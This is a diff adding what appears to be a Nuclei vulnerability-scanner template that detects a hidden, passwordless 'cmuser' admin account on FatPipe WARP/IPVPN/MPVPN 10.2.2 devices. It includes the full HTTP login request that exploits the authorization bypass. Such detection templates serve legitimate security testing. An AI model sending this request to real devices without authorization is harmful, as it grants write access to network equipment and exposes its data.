@@ -1,0 +1,39 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - part: header
+          type: word
+          words:
+            - application/json
+        - condition: and
+          type: word
+          words:
+            - '"loginRes":"success"'
+            - '"activeUserName":"cmuser"'
+      matchers-condition: and
+      raw:
+        - |
+          POST /fpui/loginServlet HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+          loginParams=%7B%22username%22%3A%22cmuser%22%2C%22password%22%3A%22%22%2C%22authType%22%3A0%7D
+id: fatpipe-backdoor
+info:
+    author: gy741
+    description: FatPipe WARP/IPVPN/MPVPN 10.2.2 contains an authorization bypass vulnerability via hidden administrative account cmuse, which has no password, has write access permissions to the device, and is not visible in Users menu list. An attacker can gain access by bypassing proper authorization, thereby making it possible to obtain sensitive information, modify data, and/or execute unauthorized operations.
+    metadata:
+        max-request: 1
+    name: FatPipe Networks WARP/IPVPN/MPVPN 10.2.2 - Authorization Bypass
+    reference:
+        - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5684.php
+        - https://www.fatpipeinc.com/support/advisories.php
+    severity: high
+    tags:
+        - fatpipe
+        - default-login
+        - backdoor
+        - auth-bypass
+        - Servlet
